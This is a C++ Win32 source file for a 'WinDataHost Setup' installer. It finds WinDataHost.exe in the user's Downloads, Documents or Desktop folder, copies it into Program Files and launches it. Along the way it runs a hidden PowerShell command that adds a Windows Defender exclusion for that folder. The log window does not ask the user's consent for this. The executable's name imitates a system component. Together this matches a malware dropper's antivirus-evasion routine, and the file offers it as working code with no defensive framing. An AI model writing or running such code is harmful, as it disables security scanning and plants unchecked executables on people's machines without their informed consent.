#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlobj.h>
#include <knownfolders.h>
#include <string>
#include <vector>
#include <filesystem>

// Note: Requires C++17 or higher
namespace fs = std::filesystem;

// Global handle for the log window
HWND g_hEditLog = NULL;

// Function to log messages to the GUI
void LogMessage(const std::wstring& message) {
    if (g_hEditLog) {
        int length = GetWindowTextLength(g_hEditLog);
        SendMessage(g_hEditLog, EM_SETSEL, (WPARAM)length, (LPARAM)length);
        SendMessage(g_hEditLog, EM_REPLACESEL, 0, (LPARAM)(message + L"\r\n").c_str());
    }
}

// Function to run a command and hide the window
bool RunHiddenCommand(const std::wstring& command) {
    STARTUPINFO si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi;

    std::wstring cmd = L"cmd.exe /c " + command;
    if (CreateProcess(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return exitCode == 0;
    }
    return false;
}

// Function to find the executable in common folders
std::wstring FindExecutable(const std::wstring& filename) {
    wchar_t path[MAX_PATH];

    // Check Downloads folder
    PWSTR pszPath = NULL;
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &pszPath))) {
        fs::path downloadPath(pszPath);
        downloadPath /= filename;
        CoTaskMemFree(pszPath);
        if (fs::exists(downloadPath)) return downloadPath.wstring();
    }

    // Check Documents folder
    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, NULL, &pszPath))) {
        fs::path docsPath(pszPath);
        docsPath /= filename;
        CoTaskMemFree(pszPath);
        if (fs::exists(docsPath)) return docsPath.wstring();
    }

    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, path))) {
        fs::path desktopPath(path);
        desktopPath /= filename;
        if (fs::exists(desktopPath)) return desktopPath.wstring();
    }

    return L"";
}

DWORD WINAPI RunSetup(LPVOID lpParam) {
    LogMessage(L"Starting Setup...");

    std::wstring exeName = L"WinDataHost.exe";
    std::wstring sourcePath = FindExecutable(exeName);

    if (sourcePath.empty()) {
        LogMessage(L"Error: WinDataHost.exe not found on Desktop or in Downloads.");
        return 0;
    }
    LogMessage(L"Found source: " + sourcePath);

    std::wstring targetDir = L"C:\\Program Files\\WinDataHost";
    if (!fs::exists(targetDir)) {
        if (fs::create_directories(targetDir)) {
            LogMessage(L"Created target directory: " + targetDir);
        } else {
            LogMessage(L"Error: Could not create target directory.");
            return 0;
        }
    } else {
        LogMessage(L"Target directory already exists.");
    }

    LogMessage(L"Setting Windows Defender exclusion...");
    std::wstring psCmd = L"powershell -Command \"Add-MpPreference -ExclusionPath '" + targetDir + L"'\"";
    if (RunHiddenCommand(psCmd)) {
        LogMessage(L"Defender exclusion set successfully.");
    } else {
        LogMessage(L"Warning: Could not set Defender exclusion (maybe already set or restricted).");
    }

    std::wstring targetPath = targetDir + L"\\" + exeName;
    try {
        fs::copy_file(sourcePath, targetPath, fs::copy_options::overwrite_existing);
        LogMessage(L"Copied file to: " + targetPath);
    } catch (const fs::filesystem_error& e) {
        std::string err = e.what();
        LogMessage(L"Error: Could not copy file. " + std::wstring(err.begin(), err.end()));
        return 0;
    }

    LogMessage(L"Starting WinDataHost.exe...");
    ShellExecute(NULL, L"open", targetPath.c_str(), NULL, targetDir.c_str(), SW_SHOW);

    LogMessage(L"Setup completed successfully.");
    return 0;
}

// Window Procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            g_hEditLog = CreateWindowEx(WS_EX_CLIENTEDGE, L"EDIT", L"",
                WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_AUTOVSCROLL | ES_READONLY,
                10, 10, 460, 240, hwnd, NULL, NULL, NULL);

            HFONT hFont = CreateFont(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, L"Consolas");
            SendMessage(g_hEditLog, WM_SETFONT, (WPARAM)hFont, TRUE);

            // Start setup in a separate thread to keep UI responsive
            CreateThread(NULL, 0, RunSetup, NULL, 0, NULL);
            return 0;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // If we were called from main(), we might need to get the real nCmdShow
    if (nCmdShow == 0) nCmdShow = SW_SHOWDEFAULT;

    const wchar_t CLASS_NAME[] = L"SetupWindowClass";

    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"WinDataHost Setup",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT, 500, 300,
        NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, nCmdShow);

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

// Support for Console SubSystem linking
int main() {
    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOWDEFAULT);
}
